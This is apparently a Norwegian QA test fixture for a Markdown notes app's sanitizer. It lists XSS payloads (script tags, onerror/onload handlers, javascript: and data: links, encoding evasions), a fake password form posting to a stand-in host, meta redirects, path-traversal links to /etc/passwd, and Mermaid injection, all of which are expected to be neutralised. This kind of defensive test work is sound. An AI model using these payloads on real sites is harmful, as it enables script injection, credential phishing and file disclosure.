---
tags: [qa, sikkerhet]
tittel: "<img src=x onerror=alert('frontmatter')>"
lenke: "javascript:alert('property')"
---
# Sikkerhet – ondsinnet HTML

**Forventet (AK20):** Ingen `alert` skal noen gang dukke opp. Ingen nettverkskall ut (B10). Farlig HTML fjernes eller vises som tekst; ufarlig HTML (`<kbd>`, `<details>`, `<mark>`, `<sub>`, `<sup>`) kan beholdes.

## Script-tagger

<script>alert('script-tagg')</script>

<SCRIPT SRC="https://example.com/ondsinnet.js"></SCRIPT>

## Hendelsesattributter

<img src="x" onerror="alert('onerror')">

<img src=x onerror=alert('onerror-uten-anførsel')>

<div onmouseover="alert('mouseover')">Hold musepekeren over meg</div>

<svg onload="alert('svg-onload')"><circle r="10"/></svg>

<details open ontoggle="alert('ontoggle')"><summary>details med ontoggle</summary>Innhold</details>

## Farlige URL-er

<a href="javascript:alert('href')">HTML-lenke med javascript:</a>

[Markdown-lenke med javascript:](javascript:alert('md-lenke'))

[Markdown-lenke med data:](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

<a href="JaVaScRiPt:alert('blandet-case')">Blandet case</a>

<a href="&#106;avascript:alert('entitet')">HTML-entitet</a>

## Innbygging og stil

<iframe src="https://example.com"></iframe>

<object data="https://example.com/x.swf"></object>

<embed src="https://example.com/x.swf">

<style>body { display: none !important; }</style>

<div style="position:fixed;inset:0;background:red;z-index:99999">Overlegg som dekker hele siden</div>

<form action="https://example.com/stjel"><input name="passord" type="password"><button>Logg inn</button></form>

<meta http-equiv="refresh" content="0;url=https://example.com">

<base href="https://example.com/">

## Ufarlig HTML (kan beholdes)

Trykk <kbd>⌘</kbd> + <kbd>K</kbd> for søk. H<sub>2</sub>O og x<sup>2</sup>. <mark>Markert</mark>.

<details>
<summary>Klikk for detaljer</summary>

Skjult innhold med **markdown** inni.

</details>

## Sti-traversering

Alle disse skal være brutte/blokkerte, aldri lese filer utenfor vaultet:

- [[../../etc/passwd]]
- ![[../../../etc/hosts]]
- ![Markdown-bilde](../../../../etc/passwd)
- ![Absolutt sti](/etc/hosts)
- ![Fil-URL](file:///etc/passwd)
- [Lenke med ..](../../../../../etc/passwd)
- [[%2e%2e/%2e%2e/etc/passwd]]

## Ondsinnet SVG-vedlegg

![[ondsinnet.svg]]

Når SVG vises som `<img>` kjører ikke script. Men hvis brukeren åpner bildets URL direkte i en ny fane, må serveren sende den med `Content-Security-Policy` (f.eks. `default-src 'none'`) eller som nedlasting.

## Mermaid-injeksjon

```mermaid
flowchart LR
    A["<img src=x onerror=alert('mermaid')>"] --> B
    click A call alert("mermaid-click")
    click B "javascript:alert('mermaid-href')"
```

## Ekstern ressurs (B10)

![Eksternt bilde](https://example.com/sporingspiksel.png)

Forventet: eksterne bilder lastes **ikke** automatisk (se spørsmål til PO i `README-QA.md`).
